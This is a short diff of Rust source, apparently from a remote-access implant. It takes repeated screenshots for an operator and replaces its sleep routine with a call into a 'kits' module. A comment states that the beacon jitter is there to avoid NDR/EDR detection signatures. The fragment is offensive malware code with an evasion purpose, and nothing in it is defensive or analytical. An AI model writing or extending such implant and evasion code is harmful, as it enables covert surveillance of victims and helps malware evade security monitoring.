@@ -327,7 +327,7 @@ fn execute(
             let mut all: Vec<Response> = Vec::new();
             for i in 0..3u8 {
                 if i > 0 {
-                    sleep_seconds(interval_secs.max(1));
+                    crate::kits::sleep(interval_secs.max(1));
                 }
                 let mut frame = crate::screenshot::do_screenshot(0);
                 // Tag the chunk name with the frame index so the operator can
@@ -394,7 +394,7 @@ pub fn sleep_seconds(seconds: u32) {
 /// metronome (a fixed-period beacon is a trivial NDR/EDR signature).
 fn sleep_jitter(base: u32, jitter_pct: u8) {
     if jitter_pct == 0 || base == 0 {
-        sleep_seconds(base);
+        crate::kits::sleep(base);
         return;
     }
     // Cheap LCG over a static seed — no need for a CSPRNG here (this only
@@ -411,5 +411,5 @@ fn sleep_jitter(base: u32, jitter_pct: u8) {
     let span = (base as u32).saturating_mul(jitter_pct as u32) / 100;
     let off = if span > 0 { x % (2 * span) } else { 0 };
     let actual = base.saturating_add(off).saturating_sub(span);
-    sleep_seconds(actual.max(1));
+    crate::kits::sleep(actual.max(1));
 }
